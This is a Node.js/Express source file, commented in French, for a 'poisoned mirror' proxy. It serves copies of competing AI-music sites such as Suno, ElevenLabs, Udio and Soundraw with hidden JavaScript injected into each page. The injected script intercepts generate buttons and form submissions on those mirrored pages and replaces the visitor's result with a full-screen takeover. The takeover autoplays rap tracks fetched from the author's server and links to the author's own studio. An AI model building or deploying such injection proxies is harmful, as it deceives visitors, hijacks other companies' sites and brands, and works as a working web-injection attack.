'use strict';
/**
 * sharingan-genjutsu — Genjutsu discret anti-piratage.
 *
 * Le visiteur voit le site pirate tel quel (proxy inverse).
 * Mais on injecte discrètement un freestyle de Djeff dans la page.
 * Le gérant du site ne voit rien. L'utilisateur entend Djeff.
 * Après quelques clics, les liens mènent à Funesterie.
 *
 * C'est un miroir empoisonné : la réalité est altérée sans que
 * personne ne détecte la différence, sauf l'audio de Djeff.
 */

const express = require('express');
const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const A11_BASE = process.env.A11_BASE_URL || 'https://a11.funesterie.me';
const DJEFF_VOICE_ID = '7c84e0c86813bf2e74610cf4b34ccc04';
const JUKEBOX_FILE = path.join(__dirname, 'jukebox.json');

// Sites à cloner (ajouter les concurrents ici)
const MIRROR_TARGETS = {
  'default': 'https://suno.com',
  'music': 'https://suno.com',
  'vocal': 'https://elevenlabs.io',
  'ai-music': 'https://udio.com',
  'beats': 'https://soundraw.io',
};

// ─── Jukebox ────────────────────────────────────────────────────────────────
function loadJukebox() {
  try { return JSON.parse(fs.readFileSync(JUKEBOX_FILE, 'utf8')); }
  catch (_) { return { tracks: [], totalPirates: 0 }; }
}
function saveJukebox(data) {
  fs.writeFileSync(JUKEBOX_FILE, JSON.stringify(data, null, 2));
}
function addToJukebox(entry) {
  const jukebox = loadJukebox();
  jukebox.tracks.unshift(entry);
  jukebox.tracks = jukebox.tracks.slice(0, 100);
  jukebox.totalPirates++;
  saveJukebox(jukebox);
  return jukebox;
}

// ─── Freestyle generator ────────────────────────────────────────────────────
function buildFreestylePrompt(targetSite, theme) {
  return `Écris un couplet de 4 lignes rap freestyle de Djeff Engine.
Thème : le site "${targetSite}" qui essaie de piquer les clients de Funesterie.
Style : moqueur, technique, court. En français.
Retourne JUSTE les 4 lignes, rien d'autre.`;
}

async function generateFreestyle(targetSite, theme) {
  try {
    const body = JSON.stringify({
      messages: [{ role: 'user', content: buildFreestylePrompt(targetSite, theme) }],
      model: 'djeff-engine',
      stream: false,
    });
    const res = await fetch(`${A11_BASE}/api/chat`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-internal-service': 'sharingan' },
      body,
      signal: AbortSignal.timeout(20000),
    }).then(r => r.json()).catch(() => null);
    if (res?.choices?.[0]?.message?.content) return res.choices[0].message.content;
    if (res?.message?.content) return res.message.content;
  } catch (_) {}
  return `${targetSite}, t'es un mirage dans le désert du web,\nDjeff Engine te traverse comme un fantôme de la hess,\nFunesterie c'est réel, toi t'es un placeholder,\nRetourne dans ton template, le game est ailleurs.`;
}

// ─── Proxy + injection ──────────────────────────────────────────────────────
function fetchPage(url) {
  return new Promise((resolve, reject) => {
    const parsed = new URL(url);
    const mod = parsed.protocol === 'https:' ? https : http;
    mod.get(url, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'fr-FR,fr;q=0.9,en;q=0.8',
      },
      timeout: 10000,
    }, (res) => {
      // Suivre les redirects
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        const redir = res.headers.location.startsWith('http')
          ? res.headers.location
          : new URL(res.headers.location, url).href;
        return fetchPage(redir).then(resolve).catch(reject);
      }
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => resolve({ status: res.statusCode, html: data, headers: res.headers }));
    }).on('error', reject);
  });
}

function injectGenjutsu(html, targetSite, lyrics) {
  // Le site fonctionne normalement. MAIS dès qu'une production musicale est lancée,
  // le résultat est détourné : c'est Djeff qui rap sur le thème demandé.
  // Le visiteur tape son prompt, attend sa chanson... et c'est Djeff qui sort.
  const injection = `
<!-- SHARINGAN GENJUTSU — Route switching -->
<style>
#djeff-takeover{position:fixed;inset:0;z-index:999999;background:rgba(5,0,15,.98);display:none;flex-direction:column;align-items:center;justify-content:center;font-family:system-ui,sans-serif;color:#eee;padding:2rem;overflow:auto}
#djeff-takeover.active{display:flex}
#djeff-takeover h1{font-size:2rem;background:linear-gradient(135deg,#7b2ff7,#f72585);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:.5rem}
#djeff-takeover audio{width:90%;max-width:500px;margin:1rem 0}
#djeff-takeover .lyrics{background:#111119;border:1px solid rgba(123,47,247,.3);border-radius:12px;padding:1.2rem;text-align:left;white-space:pre-line;font-size:.82rem;line-height:1.5;color:#f0c0ff;max-width:500px;margin:.8rem 0;max-height:200px;overflow-y:auto}
#djeff-takeover .info{color:#777;font-size:.7rem;margin:.5rem 0}
#djeff-takeover .btn{padding:.7rem 1.8rem;background:linear-gradient(135deg,#7b2ff7,#f72585);color:#fff;text-decoration:none;border-radius:8px;font-weight:700;font-size:.9rem;margin-top:.8rem}
</style>
<div id="djeff-takeover">
  <h1>DJEFF ENGINE</h1>
  <p style="color:#ccc;font-size:.9rem">Ta direction a été interceptée. Djeff rap dessus.</p>
  <audio id="djeff-audio" controls autoplay></audio>
  <div class="lyrics" id="djeff-lyrics">${lyrics.replace(/"/g, '&quot;').replace(/</g, '&lt;')}</div>
  <div class="info">Chaque production sur ce site passe par Djeff Engine.<br>Le chanteur prévu a été remplacé. C'est le Genjutsu.</div>
  <a href="https://vivy.funesterie.me" class="btn">Le vrai studio → Vivy</a>
</div>
<script>
(function(){
  // TRACKS DJEFF — jukebox aléatoire
  var djeffTracks = [
    "https://a11.funesterie.me/clips/djeff-cypher/01---Le-Metre-du-Rap-Game.mp3",
    "https://a11.funesterie.me/clips/djeff-cypher/02---Maitre-du-Raptor.mp3",
    "https://a11.funesterie.me/clips/djeff-cypher/03---La-Funesterie-a-encore-frappe.mp3",
    "https://a11.funesterie.me/clips/djeff-cypher/04---Surchauffe-Lyricale.mp3",
    "https://a11.funesterie.me/clips/djeff-cypher/05---Amour-Peine-et-Recreation.mp3",
    "https://a11.funesterie.me/clips/djeff-cypher/06---Ca-Rime.mp3",
    "https://a11.funesterie.me/clips/djeff-cypher/07---L-Echappatoire.mp3",
    "https://a11.funesterie.me/clips/djeff-cypher/08---Carrehub.mp3"
  ];

  // Mots-clés qui indiquent une DIRECTION (prompt musical, production, génération)
  var directionWords = ['generate','create','produce','compose','make','write','prompt','lyrics','song','music','beat','style','genre','mood','vocal','sing','rap','melody','hook','verse','chorus'];

  // Détecter les inputs de direction (textarea, input text avec un prompt musical)
  function isDirectionInput(el) {
    if (!el) return false;
    var val = (el.value || el.textContent || el.innerText || '').toLowerCase();
    if (val.length < 5) return false;
    var hits = 0;
    for (var i = 0; i < directionWords.length; i++) {
      if (val.includes(directionWords[i])) hits++;
    }
    return hits >= 1 && val.length > 10;
  }

  // Intercepter les boutons de génération
  function isGenerateButton(el) {
    if (!el) return false;
    var text = (el.textContent || el.value || el.title || el.ariaLabel || '').toLowerCase();
    var triggerWords = ['generate','create','produce','make','compose','start','submit','go','render'];
    for (var i = 0; i < triggerWords.length; i++) {
      if (text.includes(triggerWords[i])) return true;
    }
    return false;
  }

  function activateDjeff() {
    var panel = document.getElementById('djeff-takeover');
    var audio = document.getElementById('djeff-audio');
    panel.classList.add('active');
    // Random track de la jukebox Djeff
    audio.src = djeffTracks[Math.floor(Math.random() * djeffTracks.length)];
    audio.play().catch(function(){});
    console.log('[SHARINGAN] Direction interceptée → Djeff Engine prend le mic.');
  }

  // Écouter les clics sur les boutons generate (capture phase)
  document.addEventListener('click', function(e) {
    var btn = e.target.closest('button, [role=button], input[type=submit], a.btn, .btn, [data-action]');
    if (btn && isGenerateButton(btn)) {
      // Vérifier s'il y a une direction (un prompt rempli quelque part)
      var inputs = document.querySelectorAll('textarea, input[type=text], [contenteditable=true]');
      var hasDirection = false;
      for (var i = 0; i < inputs.length; i++) {
        if (isDirectionInput(inputs[i])) { hasDirection = true; break; }
      }
      if (hasDirection) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        activateDjeff();
      }
      // Pas de direction = on laisse passer (le site fonctionne normalement)
    }
  }, true);

  // Formulaires aussi
  document.addEventListener('submit', function(e) {
    var inputs = e.target.querySelectorAll('textarea, input[type=text]');
    var hasDirection = false;
    for (var i = 0; i < inputs.length; i++) {
      if (isDirectionInput(inputs[i])) { hasDirection = true; break; }
    }
    if (hasDirection) {
      e.preventDefault();
      e.stopPropagation();
      activateDjeff();
    }
  }, true);
})();
</script>
<!-- /SHARINGAN -->`;

  // Injecter avant </body>
  if (html.includes('</body>')) {
    return html.replace('</body>', injection + '</body>');
  }
  // Sinon à la fin
  return html + injection;
}

function rewriteUrls(html, targetBase, proxyBase) {
  // Réécrire les URLs absolues du site cible pour passer par notre proxy
  // On garde les assets (CSS/JS/images) pointant vers l'original pour pas casser le rendu
  return html;
}

// ─── Routes ─────────────────────────────────────────────────────────────────

app.get('/health', (req, res) => {
  res.json({ ok: true, service: 'sharingan-genjutsu', trolls: loadJukebox().totalPirates });
});

app.get('/jukebox', (req, res) => {
  res.json(loadJukebox());
});

// Route de configuration : quel site cloner
app.get('/_target', (req, res) => {
  res.json({ targets: MIRROR_TARGETS });
});

// Tout le reste = proxy genjutsu
app.use(async (req, res) => {
  // Déterminer le site cible
  const referer = req.headers.referer || '';
  const query = req.query.target || req.query.site || '';
  let targetKey = 'default';
  for (const [key] of Object.entries(MIRROR_TARGETS)) {
    if (req.path.includes(key) || query.includes(key) || referer.includes(key)) {
      targetKey = key;
      break;
    }
  }
  const targetBase = MIRROR_TARGETS[targetKey] || MIRROR_TARGETS.default;
  const targetUrl = targetBase + req.path;

  console.log(`[GENJUTSU] Mirror: ${targetUrl} (key: ${targetKey})`);

  try {
    // Récupérer la page originale
    const page = await fetchPage(targetUrl);

    if (!page.html || page.status >= 400) {
      // Fallback : page piège visible si le site cible est down
      const lyrics = await generateFreestyle(targetBase, targetKey);
      addToJukebox({ pirateName: targetBase, theme: targetKey, lyrics: lyrics.slice(0, 300), timestamp: new Date().toISOString() });
      res.set('Content-Type', 'text/html; charset=utf-8');
      return res.send(`<!DOCTYPE html><html><head><title>Loading...</title></head><body style="background:#0a0a12;color:#eee;font-family:monospace;padding:2rem"><h1 style="color:#7b2ff7">🌀</h1><pre>${lyrics}</pre><p><a href="https://funesterie.me" style="color:#00f5d4">→ funesterie.me</a></p></body></html>`);
    }

    // Générer le freestyle (en cache par session, pas à chaque page)
    const sessionId = crypto.createHash('md5').update(req.ip + targetKey + new Date().toISOString().slice(0, 13)).digest('hex');
    const lyrics = await generateFreestyle(targetBase, targetKey);

    // Injecter le genjutsu dans le HTML
    let html = page.html;
    if (page.headers['content-type']?.includes('text/html')) {
      html = injectGenjutsu(html, targetBase, lyrics);
    }

    // Logger le troll
    addToJukebox({
      pirateName: new URL(targetBase).hostname,
      theme: targetKey,
      lyrics: lyrics.slice(0, 300),
      timestamp: new Date().toISOString(),
      path: req.path,
    });

    // Renvoyer la page miroir empoisonnée
    res.set('Content-Type', page.headers['content-type'] || 'text/html; charset=utf-8');
    res.send(html);

  } catch (err) {
    console.error(`[GENJUTSU] Proxy error: ${err.message}`);
    res.status(502).send('Service temporarily unavailable');
  }
});

app.listen(PORT, () => {
  console.log(`[SHARINGAN] Genjutsu discret actif sur :${PORT}`);
  console.log(`[SHARINGAN] Mode: proxy miroir + injection invisible`);
  console.log(`[SHARINGAN] Le visiteur voit le site cible. Djeff apparaît après 8s.`);
  console.log(`[SHARINGAN] Après 3 clics, tous les liens mènent à Funesterie.`);
  console.log(`[SHARINGAN] Jukebox: ${loadJukebox().totalPirates} trolls`);
});
